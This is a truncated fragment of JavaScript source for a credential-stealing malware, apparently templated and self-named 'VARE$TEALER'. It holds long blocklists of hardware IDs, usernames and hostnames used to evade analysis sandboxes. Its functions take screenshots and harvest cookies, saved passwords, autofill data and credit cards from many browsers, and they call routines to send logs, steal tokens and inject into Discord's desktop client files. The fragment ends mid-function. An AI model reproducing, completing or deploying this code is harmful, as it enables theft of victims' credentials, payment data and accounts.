"38AB3342-66B0-7175-0B23-F390B3728B78", "3A9F3342-D1F2-DF37-68AE-C10F60BFB462", "3EDC0561-C455-4D64-B176-3CFBBBF3FA47", "3F284CA4-8BDF-489B-A273-41B44D668F6D", "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E", "3FADD8D6-3754-47C4-9BFF-0E35553DD5FB", "40384E87-1FBA-4096-9EA1-D110F0EA92A8", "40F100F9-401C-487D-8D37-48107C6CE1D3", "418F0D5B-FCB6-41F5-BDA5-94C1AFB240ED", "41B73342-8EA1-E6BF-ECB0-4BC8768D86E9", "42A82042-3F13-512F-5E3D-6BF4FFFD8518", "44B94D56-65AB-DC02-86A0-98143A7423BF", "4729AEB0-FC07-11E3-9673-CE39E79C8A00", "481E2042-A1AF-D390-CE06-A8F783B1E76A", "48941AE9-D52F-11DF-BBDA-503734826431", "49434D53-0200-9036-2500-369025000C65", "49434D53-0200-9036-2500-369025003865", "49434D53-0200-9036-2500-369025003A65", "49434D53-0200-9036-2500-369025003AF0", "49434D53-0200-9036-2500-369025005CF0", "49434D53-0200-9036-2500-36902500F022", "49434D53-0200-9065-2500-659025002274", "49434D53-0200-9065-2500-659025005073", "49434D53-0200-9065-2500-659025008074", "49434D53-0200-9065-2500-65902500E439", "499B0800-3C18-11EA-8000-3CECEF43FEA4", "4C4C4544-0050-3710-8058-CAC04F59344A", "4CB82042-BA8F-1748-C941-363C391CA7F3", "4CE94980-D7DA-11DD-A621-08606E889D9B", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "4DC32042-E601-F329-21C1-03F27564FD6C", "4EDF3342-E7A2-5776-4AE5-57531F471D56", "51646514-93E1-4CB6-AF29-036B45D14CBF", "52A1C000-3BAB-11EA-8000-3CECEF440204", "56B9F600-3C1C-11EA-8000-3CECEF4401DE", "59C68035-4B21-43E8-A6A6-BD734C0EE699", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "5C1CA40D-EF14-4DF8-9597-6C0B6355D0D6", "5CC7016D-76AB-492D-B178-44C12B1B3C73", "5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E", "5E573342-6093-4F2D-5F78-F51B9822B388", "5EBC5C00-3B70-11EA-8000-3CECEF4401DA", "5EBD2E42-1DB8-78A6-0EC3-031B661D5C57", "60C83342-0A97-928D-7316-5F1080A78E72", "612F079A-D69B-47EA-B7FF-13839CD17404", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "63DE70B4-1905-48F2-8CC4-F7C13B578B34", "63FA3342-31C7-4E8E-8089-DAFF6CE5E967", "64176F5E-8F74-412F-B3CF-917EFA5FB9DB", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "66729280-2B0C-4BD0-8131-950D86871E54", "66CC1742-AAC7-E368-C8AE-9EEB22BD9F3B", "671BC5F7-4B0F-FF43-B923-8B1645581DC8", "67442042-0F69-367D-1B2E-1EE846020090", "67C5A563-3218-4718-8251-F38E3F6A89C1", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "686D4936-87C1-4EBD-BEB7-B3D92ECA4E28", "6881083C-EE5A-43E7-B7E3-A0CE9227839C", "69AEA650-3AE3-455C-9F80-51159BAE5EAE", "6A669639-4BD2-47E5-BE03-9CBAFC9EF9B3", "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32", "6ECEAF72-3548-476C-BD8D-73134A9182C8", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "71522042-DA0B-6793-668B-CE95AEA7FE21", "72492D47-52EF-427A-B623-D4F2192F97D4", "73163342-B704-86D5-519B-18E1D191335C", "777D84B3-88D1-451C-93E4-D235177420A7", "782ED390-AE10-4727-A866-07018A8DED22", "79AF5279-16CF-4094-9758-F88A616D81B4", "7A484800-3B19-11EA-8000-3CECEF440122", "7AB5C494-39F5-4941-9163-47F54D6D5016", "7CA33342-A88C-7CD1-1ABB-7C0A82F488BF", "7D341C16-E8E9-42EA-8779-93653D877231", "7D6A0A6D-394E-4179-9636-662A8D2C7304", "7E4755A6-7160-4982-8F5D-6AA481749F10", "80152042-2F34-11D1-441F-5FADCA01996D", "83BFD600-3C27-11EA-8000-3CECEF4400B4", "844703CF-AA4E-49F3-9D5C-74B8D1F5DCB6", "84782042-E646-50A0-159F-A8E75D4F9402", "84FE3342-6C67-5FC6-5639-9B3CA3D775A1", "84FEEFBC-805F-4C0E-AD5B-A0042999134D", "8703841B-3C5E-461C-BE72-1747D651CE89", "88DC3342-12E6-7D62-B0AE-C80E578E7B07", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "8DA62042-8B59-B4E3-D232-38B29A10964A", "8EC60B88-7F2B-42DA-B8C3-4E2EF2A8C603", "907A2A79-7116-4CB6-9FA5-E5A58C4587CD", "90A83342-D7E7-7A14-FFB3-2AA345FDBC89", "91625303-5211-4AAC-9842-01A41BA60D5A", "91A9EEDB-4652-4453-AC5B-8E92E68CBCF5", "921E2042-70D3-F9F1-8CBD-B398A21F89C6", "94515D88-D62B-498A-BA7C-3614B5D4307C", "95BF6A00-3C63-11EA-8000-3CECEF43FEB8", "96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE", "9921DE3A-5C1A-DF11-9078-563412000026", "9B2F7E00-6F4C-11EA-8000-3CECEF467028", "9C6D1742-046D-BC94-ED09-C36F70CC9A91", "9FC997CA-5081-4751-BC78-CE56D06F6A62", "A100EFD7-4A31-458F-B7FE-2EF95162B32F", "A15A930C-8251-9645-AF63-E45AD728C20C", "A19323DA-80B2-48C9-9F8F-B21D08C3FE07", "A1A849F7-0D57-4AD3-9073-C79D274EECC8", "A2339E80-BB69-4BF5-84BC-E9BE9D574A65", "A5CE2042-8D25-24C4-71F7-F56309D7D45F", "A6A21742-8023-CED9-EA8D-8F0BC4B35DEA", "A7721742-BE24-8A1C-B859-D7F8251A83D3", "A9C83342-4800-0578-1EE8-BA26D2A678D2", "AAFC2042-4721-4E22-F795-A60296CAC029", "ACA69200-3C4C-11EA-8000-3CECEF4401AA", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1", "B1112042-52E8-E25B-3655-6A4F54155DBF", "B22B623B-6B62-4F9B-A9D3-94A15453CEF4", "B5B77895-D40B-4F30-A565-6EF72586A14A", "B6464A2B-92C7-4B95-A2D0-E5410081B812", "B9DA2042-0D7B-F938-8E8A-DA098462AAEC", "BB233342-2E01-718F-D4A1-E7F69D026428", "BB64E044-87BA-C847-BC0A-C797D1A16A50", "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E", "BFE62042-E4E1-0B20-6076-C5D83EDFAFCE", "C0342042-AF96-18EE-C570-A5EFA8FF8890", "C249957A-AA08-4B21-933F-9271BEC63C85", "C364B4FE-F1C1-4F2D-8424-CB9BD735EF6E", "C51E9A00-3BC3-11EA-8000-3CECEF440034", "C6B32042-4EC3-6FDF-C725-6F63914DA7C7", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "C9283342-8499-721F-12BE-32A556C9A7A8", "CC4AB400-3C66-11EA-8000-3CECEF43FE56", "CC5B3F62-2A04-4D2E-A46C-AA41B7050712", "CD74107E-444E-11EB-BA3A-E3FDD4B29537", "CE352E42-9339-8484-293A-BD50CDC639A5", "CEFC836C-8CB1-45A6-ADD7-209085EE2A57", "CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F", "D2DC3342-396C-6737-A8F6-0C6673C1DE08", "D4260370-C9F1-4195-95A8-585611AE73F2", "D4C44C15-4BAE-469B-B8FD-86E5C7EB89AB", "D5DD3342-46B5-298A-2E81-5CA6867168BE", "D7382042-00A0-A6F0-1E51-FD1BBF06CD71", "D7958D98-A51E-4B34-8C51-547A6C2E6615", "D8C30328-1B06-4611-8E3C-E433F4F9794E", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D", "DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F", "DD45F600-3C63-11EA-8000-3CECEF440156", "DD9C3342-FB80-9A31-EB04-5794E5AE2B4C", "DEAEB8CE-A573-9F48-BD40-62ED6C223F20", "E08DE9AA-C704-4261-B32D-57B2A3993518", "E0C806ED-B25A-4744-AD7D-59771187122E", "E1BA2E42-EFB1-CDFD-7A84-8A39F747E0C5", "E2342042-A1F8-3DCF-0182-0E63D607BCC7", "E3BB3342-02A8-5613-9C92-3747616194FD", "E57F6333-A2AC-4F65-B442-20E928C0A625", "E67640B3-2B34-4D7F-BD62-59A1822DDBDC", "E6DBCCDF-5082-4479-B61A-6990D92ACC5F", "E773CC89-EFB8-4DB6-A46E-6CCA20FE4E1A", "EADD1742-4807-00A0-F92E-CCD933E9D8C1", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "F3EA4E00-3C5F-11EA-8000-3CECEF440016", "F5744000-3C78-11EA-8000-3CECEF43FEFE", "F5BB1742-D36D-A11E-6580-2EA2427B0038", "F5EFEEAC-96A0-11EB-8365-FAFE299935A9", "F68B2042-E3A7-2ADA-ADBC-A6274307A317", "F705420F-0BB3-4688-B75C-6CD1352CABA9", "F91C9458-6656-4E83-B84A-13641DE92949", "F9E41000-3B35-11EA-8000-3CECEF440150", "FA612E42-DC79-4F91-CA17-1538AD635C95", "FA8C2042-205D-13B0-FCB5-C5CC55577A35", "FBC62042-5DE9-16AD-3F27-F818E5F68DD3", "FC40ACF8-DD97-4590-B605-83B595B0C4BA", "FCE23342-91F1-EAFC-BA97-5AAE4509E173", "FE455D1A-BE27-4BA4-96C8-967A6D3A9661", "FED63342-E0D6-C669-D53F-253D696D74DA", "FF577B79-782E-0A4D-8568-B35A9B7EB76B", "9CFF2042-2043-0340-4F9C-4BAE6DC5BB39", "D7AC2042-05F8-0037-54A6-38387D00B767", "52562042-B33F-C9D3-0149-241F40A0F5D8", "3E9AC505-812A-456F-A9E6-C7426582500E", "11E12042-2404-040A-31E4-27374099F748", "6E963342-B9C8-2D14-B057-C60C35722AD4", "9EB0FAF6-0713-4576-BD64-813DEE9E477E", "0B8A2042-2E8E-BECC-B6A4-7925F2163DC9", "89E32042-1B2B-5C76-E966-D4E363846FD4", "699400A5-AFC6-427A-A56F-CE63D3E121CB", "2F230ED7-5797-4DB2-BAA0-99A193503E4B"]
  var pcuserblack = ["05h00Gi0", "3u2v9m8", "43By4", "4tgiizsLimS", "6O4KyHhJXBiR", "7wjlGX7PjlW4", "8Nl0ColNQ5bq", "8VizSM", "Abby", "Amy", "AppOnFlySupport", "ASPNET", "azure", "BUiA1hkm", "BvJChRPnsxn", "cM0uEGN4do", "cMkNdS6", "DefaultAccount", "dOuyo8RV71", "DVrzi", "e60UW", "ecVtZ5wE", "EGG0p", "Frank", "fred", "G2DbYLDgzz8Y", "george", "GjBsjb", "Guest", "h7dk1xPr", "h86LHD", "Harry Johnson", "HEUeRzl", "hmarc", "ICQja5iT", "IVwoKUF", "j6SHA37KA", "j7pNjWM", "John", "jude", "Julia", "kEecfMwgj", "kFu0lQwgX5P", "KUv3bT4", "Lisa", "lK3zMR", "lmVwjj9b", "Louise", "Lucas", "mike", "Mr.None", "noK4zG7ZhOf", "o6jdigq", "o8yTi52T", "OgJb6GqgK0O", "patex", "PateX", "Paul Jones", "pf5vj", "PgfV1X", "PqONjHVwexsS", "pWOuqdTDQ", "PxmdUOpVyx", "QfofoG", "QmIS5df7u", "QORxJKNk", "qZo9A", "RDhJ0CNFevzX", "RGzcBUyrznReg", "S7Wjuf", "server", "SqgFOf3G", "Steve", "test", "TVM", "txWas1m2t", "umyUJ", "Uox1tzaMO", "User01", "w0fjuOVmCcP5A", "WDAGUtilityAccount", "XMiMmcKziitD", "xPLyvzr8sgC", "ykj0egq7fze", "DdQrgc", "ryjIJKIrOMs", "nZAp7UBVaS1", "zOEsT", "l3cnbB8Ar5b8", "xUnUy", "fNBDSlDTXY", "vzY4jmH0Jw02", "gu17B", "UiQcX", "21zLucUnfI85", "OZFUCOD6", "8LnfAai9QdJR", "5sIBK", "rB5BnfuR2", "GexwjQdjXG", "IZZuXj", "ymONofg", "dxd8DJ7c", "JAW4Dz0", "GJAm1NxXVm", "UspG1y1C", "equZE3J", "BXw7q", "lubi53aN14cU", "5Y3y73", "9yjCPsEYIMH", "GGw8NR", "JcOtj17dZx", "05KvAUQKPQ", "64F2tKIqO5", "7DBgdxu", "uHUQIuwoEFU", "gL50ksOp", "Of20XqH4VL", "tHiF2T", "sal.rosenburg"];
  var hostnameblack = ["373836","00900BC83803", "0CC47AC83803", "6C4E733F-C2D9-4", "ACEPC", "AIDANPC", "ALENMOOS-PC", "ALIONE", "APPONFLY-VPS", "ARCHIBALDPC", "azure", "B30F0242-1C6A-4", "BAROSINO-PC", "BECKER-PC", "BEE7370C-8C0C-4", "COFFEE-SHOP", "COMPNAME_4047", "d1bnJkfVlH", "DESKTOP-19OLLTD", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "DESKTOP-4U8DTF8", "DESKTOP-54XGX6F", "DESKTOP-5OV9S0O", "DESKTOP-6AKQQAM", "DESKTOP-6BMFT65", "DESKTOP-70T5SDX", "DESKTOP-7AFSTDP", "DESKTOP-7XC6GEZ", "DESKTOP-8K9D93B", "DESKTOP-AHGXKTV", "DESKTOP-ALBERTO", "DESKTOP-B0T93D6", "DESKTOP-BGN5L8Y", "DESKTOP-BUGIO", "DESKTOP-BXJYAEC", "DESKTOP-CBGPFEE", "DESKTOP-CDQE7VN", "DESKTOP-CHAYANN", "DESKTOP-CM0DAW8", "DESKTOP-CNFVLMW", "DESKTOP-CRCCCOT", "DESKTOP-D019GDM", "DESKTOP-D4FEN3M", "DESKTOP-DE369SE", "DESKTOP-DIL6IYA", "DESKTOP-ECWZXY2", "DESKTOP-F7BGEN9", "DESKTOP-FSHHZLJ", "DESKTOP-G4CWFLF", "DESKTOP-GELATOR", "DESKTOP-GLBAZXT", "DESKTOP-GNQZM0O", "DESKTOP-GPPK5VQ", "DESKTOP-HASANLO", "DESKTOP-HQLUWFA", "DESKTOP-HSS0DJ9", "DESKTOP-IAPKN1P", "DESKTOP-IFCAQVL", "DESKTOP-ION5ZSB", "DESKTOP-JQPIFWD", "DESKTOP-KALVINO", "DESKTOP-KOKOVSK", "DESKTOP-NAKFFMT", "DESKTOP-NKP0I4P", "DESKTOP-NM1ZPLG", "DESKTOP-NTU7VUO", "DESKTOP-QUAY8GS", "DESKTOP-RCA3QWX", "DESKTOP-RHXDKWW", "DESKTOP-S1LFPHO", "DESKTOP-SUPERIO", "DESKTOP-V1L26J5", "DESKTOP-VIRENDO", "DESKTOP-VKNFFB6", "DESKTOP-VRSQLAG", "DESKTOP-VWJU7MF", "DESKTOP-VZ5ZSYI", "DESKTOP-W8JLV9V", "DESKTOP-WG3MYJS", "DESKTOP-WI8CLET", "DESKTOP-XOY7MHS", "DESKTOP-Y8ASUIL", "DESKTOP-YW9UO1H", "DESKTOP-ZJF9KAN", "DESKTOP-ZMYEHDA", "DESKTOP-ZNCAEAM", "DESKTOP-ZOJJ8KL", "DESKTOP-ZV9GVYL", "DOMIC-DESKTOP", "EA8C2E2A-D017-4", "ESPNHOOL", "GANGISTAN", "GBQHURCC", "GRAFPC", "GRXNNIIE", "gYyZc9HZCYhRLNg", "JBYQTQBO", "JERRY-TRUJILLO", "JOHN-PC", "JUDES-DOJO", "JULIA-PC", "LANTECH-LLC", "LISA-PC", "LOUISE-PC", "LUCAS-PC", "MIKE-PC", "NETTYPC", "ORELEEPC", "ORXGKKZC", "Paul Jones", "PC-DANIELE", "PROPERTY-LTD", "Q9IATRKPRH", "QarZhrdBpj", "RALPHS-PC", "SERVER-PC", "SERVER1", "Steve", "SYKGUIDE-WS17", "T00917", "test42", "TIQIYLA9TW5M", "TMKNGOMU", "TVM-PC", "VONRAHEL", "WILEYPC", "WIN-5E07COS9ALR", "WINDOWS-EEL53SN", "WINZDS-1BHRVPQU", "WINZDS-22URJIBV", "WINZDS-3FF2I9SN", "WINZDS-5J75DTHH", "WINZDS-6TUIHN7R", "WINZDS-8MAEI8E4", "WINZDS-9IO75SVG", "WINZDS-AM76HPK2", "WINZDS-B03L9CEO", "WINZDS-BMSMD8ME", "WINZDS-BUAOKGG1", "WINZDS-K7VIK4FC", "WINZDS-QNGKGN59", "WINZDS-RST0E8VU", "WINZDS-U95191IG", "WINZDS-VQH86L5D", "WORK", "XC64ZB", "XGNSVODU", "ZELJAVA", "3CECEFC83806", "C81F66C83805", "DESKTOP-USLVD7G", "DESKTOP-AUPFKSY", "DESKTOP-RP4FIBL", "DESKTOP-6UJBD2J", "DESKTOP-LTMCKLA", "DESKTOP-FLTWYYU", "DESKTOP-WA2BY3L", "DESKTOP-UBDJJ0A", "DESKTOP-KXP5YFO", "DESKTOP-DAU8GJ2", "DESKTOP-FCRB3FM", "DESKTOP-VYRNO7M", "DESKTOP-PKQNDSR", "DESKTOP-SCNDJWE", "DESKTOP-RSNLFZS", "DESKTOP-MWFRVKH", "DESKTOP-QLN2VUF", "DESKTOP-62YPFIQ", "DESKTOP-PA0FNV5", "DESKTOP-B9OARKC", "DESKTOP-J5XGGXR", "DESKTOP-JHUHOTB", "DESKTOP-64ACUCH", "DESKTOP-SUNDMI5", "DESKTOP-GCN6MIO", "FERREIRA-W10", "DESKTOP-MJC6500", "DESKTOP-WS7PPR2", "DESKTOP-XWQ5FUV", "DESKTOP-UHHSY4R", "DESKTOP-ZJRWGX5", "DESKTOP-ZYQYSRD", "WINZDS-MILOBM35", "DESKTOP-K8Y2SAM", "DESKTOP-4GCZVJU", "DESKTOP-O6FBMF7", "DESKTOP-WDT1SL6", "EIEEIFYE", "CRYPTODEV222222", "EFA0FDEC-8FA7-4"];

  if (pcuserblack.includes(os.userInfo().username)) {
    process.exit(1);
  }
  if (hostnameblack.includes(os.hostname())) {
      process.exit(1);
  }
  if (hwidblack.includes(hwid)) {
      process.exit(1);
  }
  await %VARESTARTUP%()
  await %VAREUSERDATA%()
  await %VARESCREENSHOT%().then(res => {
    fs.access(appdata +`\\${cr}_${os.hostname}${random}${random}\\[VARE] User\\screenshot.png`, fs.constants.F_OK, (err) => {
      if (err) {
        %VARESCREENSHOT%()
        return;
      }
      });
  })
  await %VAREALLCOOKIES%()
  await %VAREALLPASS%()
  await %VAREALLAUTOFILL%()
  await %VAREALLCCS%()
  await %SENDLOGS%()
  await %VARESLEEP%(5000)
  await %DISCORDINJ%()
  await %VARESTEALTOKEN%()
}


async function %VAREALLCCS%() {
    let cr = await %GETCOUNTRY%();
    fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}`, (err) => {
    });
    fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}\\[VARE] Cards\\`, (err) => {
    });
    let creditcards = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Web Data'))
            creditcards += await %VARECARDS%(paths[i]) || '';
    }
    if (!creditcards.includes('NUMBER:')) creditcards = '~|~|~ VARE$TEALER ~|~|~\n Creditcards not found. '
    else creditcards = creditcards.slice(2)
  
    fs.writeFileSync(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}\\[VARE] Cards\\ALL Cards.txt`, creditcards)
  
}


async function %VAREALLPASS%() {
  let country = await %GETCOUNTRY%();
  fs.mkdir(process.env.APPDATA + `\\${country}_${os.hostname}${random}${random}`, (err) => {
  });
  fs.mkdir(process.env.APPDATA + `\\${country}_${os.hostname}${random}${random}\\[VARE] Passwords\\`, (err) => {
  });
  let appData = process.env.APPDATA;
  let localAppData = process.env.LOCALAPPDATA;
  let passwords = '';
  for (let i = 0; i < paths.length; i++) {
      if (fs.existsSync(paths[i] + 'Login Data')) {
          passwords += await %VAREPASS%(paths[i]) || '';
      }
  }
  fs.writeFile(process.env.APPDATA + `\\${country}_${os.hostname}${random}${random}\\[VARE] Passwords\\ALL Passwords.txt`, passwords, function (err, data) {
      if (err) throw err;
  });
}

async function %VAREALLCOOKIES%() {
  let founds = [];
  let cr = await %GETCOUNTRY%();
  let appdata = process.env.APPDATA;
  let localappdata = process.env.LOCALAPPDATA;
  let cookiepaths = {
    'Opera': appdata + '\\Opera Software\\Opera Stable\\',
    'Opera GX': appdata + '\\Opera Software\\Opera GX Stable\\',
    'Amigo': localappdata + '\\Amigo\\User Data\\',
    'Torch': localappdata + '\\Torch\\User Data\\',
    'Kometa': localappdata + '\\Kometa\\User Data\\',
    'Orbitum': localappdata + '\\Orbitum\\User Data\\',
    'CentBrowser': localappdata + '\\CentBrowser\\User Data\\',
    '7Star': localappdata + '\\7Star\\7Star\\User Data\\',
    'Sputnik': localappdata + '\\Sputnik\\Sputnik\\User Data\\',
    'Vivaldi': localappdata + '\\Vivaldi\\User Data\\Default\\',
    'Chrome SxS': localappdata + '\\Google\\Chrome SxS\\User Data\\',
    'Chrome': localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    'Epic Privacy Browser': localappdata + '\\Epic Privacy Browser\\User Data\\',
    'Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    'Uran': localappdata + '\\uCozMedia\\Uran\\User Data\\Default\\',
    'Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    'Microsoft Edge Profile 1': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    'Microsoft Edge Profile 2': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    'Microsoft Edge Profile 3': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    'Microsoft Edge Profile 4': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    'Microsoft Edge Profile 5': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    'Microsoft Edge Guest': localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    'Yandex': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
    'Yandex Profile 1': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    'Yandex Profile 2': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    'Yandex Profile 3': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    'Yandex Profile 4': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    'Yandex Profile 5': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    'Yandex Guest': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    'Iridium': localappdata + '\\Iridium\\User Data\\Default\\',
    'Chrome Profile 1': localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    'Chrome Profile 2': localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    'Chrome Profile 3': localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    'Chrome Profile 4': localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    'Chrome Profile 5': localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    'Chrome Guest ':localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    'Brave':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    'Brave Profile 1':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    'Brave Profile 2':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    'Brave Profile 3':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    'Brave Profile 4':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    'Brave Profile 5':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    'Brave Guest':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
  };
  fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}`, (err) => {

  });
  fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}\\[VARE] Cookies\\`, (err) => {
  });
  for (let browser in cookiepaths) {
      let path = cookiepaths[browser];
      let cookies = await %VARECOOKIES%(path);
      if (cookies && cookies != '~|~|~ VARE$TEALER ~|~|~ \n') {
        %keywordstring%.forEach((keyword) => {
          if (cookies.includes(keyword)) {
            if (!founds[browser]) {
              founds[browser] = [];
            }
            founds[browser].push(keyword);
          }
        });
        %keywordstring%.forEach((keyword) => {
          if (cookies.includes(keyword)) {
            if (!all_founds) {
              all_founds = [];
            }
            all_founds.push(keyword);
          }
        });
        try {
          let browserCookies = `founded Keywords : ${founds[browser]}\n\n${cookies}`;
          fs.writeFileSync(`${appdata}\\${cr}_${os.hostname}${random}${random}\\[VARE] Cookies\\${browser}.txt`, browserCookies);
        } catch (err) {
        }
      }
    }

}

async function %VAREALLAUTOFILL%() {
  let cr = await %GETCOUNTRY%();
  let appdata = process.env.APPDATA;
  let localappdata = process.env.LOCALAPPDATA;
  let autofillpaths = {
    'Opera': appdata + '\\Opera Software\\Opera Stable\\',
    'Opera GX': appdata + '\\Opera Software\\Opera GX Stable\\',
    'Amigo': localappdata + '\\Amigo\\User Data\\',
    'Torch': localappdata + '\\Torch\\User Data\\',
    'Kometa': localappdata + '\\Kometa\\User Data\\',
    'Orbitum': localappdata + '\\Orbitum\\User Data\\',
    'CentBrowser': localappdata + '\\CentBrowser\\User Data\\',
    '7Star': localappdata + '\\7Star\\7Star\\User Data\\',
    'Sputnik': localappdata + '\\Sputnik\\Sputnik\\User Data\\',
    'Vivaldi': localappdata + '\\Vivaldi\\User Data\\Default\\',
    'Chrome SxS': localappdata + '\\Google\\Chrome SxS\\User Data\\',
    'Chrome': localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    'Epic Privacy Browser': localappdata + '\\Epic Privacy Browser\\User Data\\',
    'Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    'Uran': localappdata + '\\uCozMedia\\Uran\\User Data\\Default\\',
    'Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    'Microsoft Edge Profile 1': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    'Microsoft Edge Profile 2': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    'Microsoft Edge Profile 3': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    'Microsoft Edge Profile 4': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    'Microsoft Edge Profile 5': localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    'Microsoft Edge Guest': localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    'Yandex': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
    'Yandex Profile 1': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    'Yandex Profile 2': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    'Yandex Profile 3': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    'Yandex Profile 4': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    'Yandex Profile 5': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    'Yandex Guest': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    'Iridium': localappdata + '\\Iridium\\User Data\\Default\\',
    'Chrome Profile 1': localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    'Chrome Profile 2': localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    'Chrome Profile 3': localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    'Chrome Profile 4': localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    'Chrome Profile 5': localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    'Chrome Guest ':localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    'Brave':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    'Brave Profile 1':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    'Brave Profile 2':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    'Brave Profile 3':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    'Brave Profile 4':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    'Brave Profile 5':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    'Brave Guest':localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
  };
  fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}`, (err) => {

  });
  fs.mkdir(process.env.APPDATA + `\\${cr}_${os.hostname}${random}${random}\\[VARE] AutoFill\\`, (err) => {
  });
  try {
  for (let browser in autofillpaths) {
    let path = autofillpaths[browser];
      let data = await %VAREAUTOFILL%(path);
      if (data) {
        fs.writeFileSync( appdata + `\\${cr}_${os.hostname}${random}${random}\\[VARE] AutoFill\\` + browser + ".txt", data);

      } else {
      }
  }
}catch{}

}

function %FINDINDEX%(firstpath) {
  let dcpaths = fs.readdirSync(firstpath);
  dcpaths.forEach((file) => {
      let filePath = path.join(firstpath, file);
      let fileStat = fs.statSync(filePath);
      if (fileStat.isDirectory()) {
          %FINDINDEX%(filePath);
      } else {
          if (file === "index.js" && 
              !firstpath.includes("node_modules") && 
              firstpath.includes("desktop_core")) {
              injectPath.push(filePath);
          }
      }
  });
}

async function %FINDINJ%(firstpath) {
  const files = await fs.promises.readdir(firstpath);
  for (const file of files) {
      const filePath = path.join(firstpath, file);
      const fileStat = await fs.promises.stat(filePath);
      if (fileStat.isDirectory()) {
          if (file === 'vare') {
              await fs.rmdirSync(filePath);
          } else {
